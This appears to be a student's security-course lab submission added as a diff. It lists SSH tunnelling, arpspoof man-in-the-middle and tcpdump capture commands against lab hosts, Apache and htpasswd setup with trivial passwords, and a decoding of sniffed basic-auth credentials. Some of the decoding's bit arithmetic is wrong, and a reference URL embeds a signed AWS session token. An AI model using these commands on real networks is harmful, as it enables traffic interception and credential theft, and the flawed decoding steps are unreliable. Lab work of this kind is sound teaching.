@@ -1,0 +1,104 @@
+CMSC 626 Principles of Computer Security
+Project 2
+Exercise 8
+
+2.
+
+	a.	ssh -D 0.0.0.0:22222 -f -q -N Faisal@130.85.121.106
+		ssh -o ProxyCommand='nc -x 127.0.0.1:22222 %h %p' crsuser@133.228.98.1
+		ssh -D 0.0.0.0:22222 -f -q -N Shrenik@130.85.220.34
+		ssh -o ProxyCommand='nc -x 127.0.0.1:22222 %h %p' crsuser@133.228.81.1
+		ssh Faisal@130.85.121.106
+		ssh Shrenik@130.85.220.34
+		ssh crsuser@133.228.98.1
+		ssh crsuser@133.228.98.3
+		ssh crsuser@133.228.81.1
+		ssh crsuser@133.228.81.3
+
+	b.	sudo arpspoof -i eth1 -t 133.228.98.2 -r 133.228.98.3
+		sudo arpspoof -i eth1 -t 133.228.81.2 -r 133.228.81.3
+		sudo arpspoof -i eth1 -t 133.228.98.2 -r 133.228.81.3
+		sudo tcpdump -i eth1 -n -w tcpdump_http2.pcap 'host 133.228.98.2 and host 133.228.98.3 and tcp and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2))!=0)'
+		cat tcpdump_http2.pcap
+		sudo sysctl -w net.ipv4.ip_forward=1
+		sudo tcpdump -i eth1 -n -w tcpdump_https.pcap 'host 133.228.98.2 and host 133.228.98.3 and tcp and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2))!=0)'
+		cat tcpdump_https.pcap
+		sudo tcpdump -i eth1 -n 'host 133.228.98.2 and host 133.228.81.3 and tcp and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2))!=0)'
+
+	c.	sudo a2enmod ssl
+		sudo systemctl restart apache2
+		sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key -out /etc/ssl/certs/apache-selfsigned.crt
+		sudo nano /etc/apache2/sites-available/VB02734.csee.umbc.local.conf
+		sudo mkdir /var/www/html/private
+		sudo nano /var/www/html/private/team.html
+		sudo a2ensite VB02734.csee.umbc.local.conf
+		sudo apache2ctl configtest
+		sudo systemctl reload apache2
+
+	d.	sudo mkdir /var/www/passwords
+		sudo touch /var/www/passwords
+		sudo htpasswd -c /var/www/passwords/password.file user1
+			Password: user1
+		sudo htpasswd -c /var/www/passwords/password.file user2
+			Password:user2
+
+	e.	From the tcpdump .pcap file tcpdump_http2.pcap found this encode text of base64 : 'dXNlcjI6dXNlcjI='
+		Decoding 'dXNlcjI6dXNlcjI=' :
+		base64 table:
+		A:0,B:1,.....Z:25,a:26,b:27,.....,z:51,0:52,.....,9:61,+:62,/:63
+		d   X  N   l   c   j  I  6  d   X   N   l   c   j   I =
+		29 23  13  37  28 38  8 58  29  23  13  37  28  38  8 used for padding
+		base64 text are represented by binary 6 bits 
+		Convert each 4-character chunk to its corresponding 3-byte sequence using the Base64 alphabet:
+
+For dXNl, the corresponding 3-byte sequence is 011101 010111 001101 100101.
+								01110101 01110011 01100101
+								  u         s        e	
+For cjI6, the corresponding 3-byte sequence is 011100 100110 011001 101110.
+								01110010 01100110 01101110
+								  r         2        :
+For dXNl, the corresponding 3-byte sequence is 011101 010111 001101 100101.
+								01110101 01110011 01100101
+								  u         s        e
+For cjI=, the corresponding 3-byte sequence is 011100 100111 100100 111100.
+								01110010 0111001 00111100
+								  r         2    (padding value)
+		The decoded value is user2:user2, as the username is user2 and password is user2
+		
+		Packet number 7 gives the encoded base64 user name and password.
+		02:13:07.394582 IP 133.228.98.3.80 > 133.228.98.2.37792: Flags [P.], seq 1:576, ack 413, win 506, options [nop,nop,TS val 2796815281 ecr 2641333745], length 575: HTTP: HTTP/1.1 200 OK
+		the above packet which is number 7 gives the user credential details
+
+
+
+3. 	team.html
+	hello.html
+	pass.htaccess
+
+4.	tcpdump_http.pcap
+	tcpdump_http.txt
+
+5.	tcpdump_https.pcap
+	tcpdump_https.txt
+
+
+
+
+
+
+
+
+
+
+References:
+
+https://learn-us-east-1-prod-fleet01-xythos.content.blackboardcdn.com/blackboard.learn.xythos.prod/5954eb74c7df4/21843774?X-Blackboard-S3-Bucket=blackboard.learn.xythos.prod&X-Blackboard-Expiration=1682845200000&X-Blackboard-Signature=RGA746DF4R3ELuyPBBHsZCheP9pTOiCb7Kocor4fAMw%3D&X-Blackboard-Client-Id=100208&X-Blackboard-S3-Region=us-east-1&response-cache-control=private%2C%20max-age%3D21600&response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%27L16-CH09-IPS%25281%2529.pdf&response-content-type=application%2Fpdf&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLWVhc3QtMSJHMEUCIQDrknicpkRjgKg6F6t518Fm06a%2BrYXU31xxHw%2F26hY56wIgTBkkoARNSbGLnSx1nclZcVnS%2BmDQt2C3cb9EubQgF1UqvAUIhf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw1NTY5MDM4NjEzNjEiDAjz%2Fviylk0kf7gzViqQBZZTyQNqpZ8FcRltmQWaovdU%2Fh8sF9A6OqPbU2thzlIjRivinnrixXbKdgil2LymmbBwrzE422sOUAD%2FLO418ZszrqAbvjTgqfGaMKZYz9AyLgMY5AN9VvnVLxCg7aL46mlGgLu%2FtPjwUkIJTsoU3A2d1UE3b67VD%2FVfJB%2BGdT19JFm590fq%2Bco0LtKuIsWN3IIS9MjWRfMMZovBAqCYTnb2A7Bp7HBoANILSllsnUDJbetf8OnhMMqRHBEUFpM9tHwvE5yfzWuxgsUXPKt4CQ9KJk1%2BZVJUF2Hp9dys%2F9eavBhTImYNYEooc1xOGart9IyTOzzEH2osCh9rq%2F6EEM1%2Fe2GAbdMNbd0kEGqeL1kIijrEcW5M1KxQqTXdN0it%2BiRz4CER%2BomwWSu8CV%2Bk9%2B%2B9%2FsU%2BvDkerK8wXvlV6bBSjogp1Um0%2B4%2BsRvGgqs4YjrCyyMZLuVh2lkfd4EVOugWfMsHeh%2BEGKelysN0bv0wvjlAnukzyZmpAEdOPEZu3YiM1TWV%2BgHr5aSM%2BM5TbBhCkmWXSv7a8XuS602FZzwNqr32iIWS%2BVWec%2FAr3PPWjxd51ZA4NHAuXNP5t6brnio06UDXpQeCKs%2BVXiHXTX4YlVdcXzIiZU1br65zfkCFm%2BKQkXOfQGwd7NK13SXBXpqNM7oSj1wTdLC1wvc%2F91rYrVzT1rjIXZxeu6vjfrrRl7UUxojBDzxhgdnR82cgjvOIbVXwDLoVNXaZNeWRSJxCBmEonhielyL4jKofWtBsdl%2BQ4IR0k7sm6wVYJna1uX8Gmat%2FhIP4IbG8%2BZGAlIiNoa6Zgdz%2F7xWYv3Jbe1xCgKCRQIhe6UtCrCR2dVR7Kx9s4n7NoXMk%2Bly%2B8oz1A7%2FOcMPbLt6IGOrEBVtynkEEevoNLgGbGaIfbWpRJ8TleSSuiPs01oTV0gKaKmUIVp4TIlQTTMnLTZgMBtrpX02AwWe%2BcGam9XJHUXx%2FCtDzU3hldY3z4Xdlbpr4XfJl6KNwiCAWEBnYI3LeCK8StWSIlgVwbT4cPOB4ZgVKdVbKCP8kAPgZHWLzCWGGA7gpoiP%2FeCMnLWDgv2a0eDRW8IxmedB85qCyvoXMgXEEd3bjZfleDicP1C3N%2BrGE7&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20230430T030000Z&X-Amz-SignedHeaders=host&X-Amz-Expires=21600&X-Amz-Credential=ASIAYDKQORRYY25THIKG%2F20230430%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=09403c00a0e8adc13586332365c2bc949d8f232ac30ae1634177de540283c792
+
+
+https://tutorialedge.net/security/arp-spoofing-for-mitm-attack-tutorial/
+
+https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-22-04
+
+https://httpd.apache.org/docs/2.4/mod/quickreference.html
+
+https://en.wikipedia.org/wiki/Base64
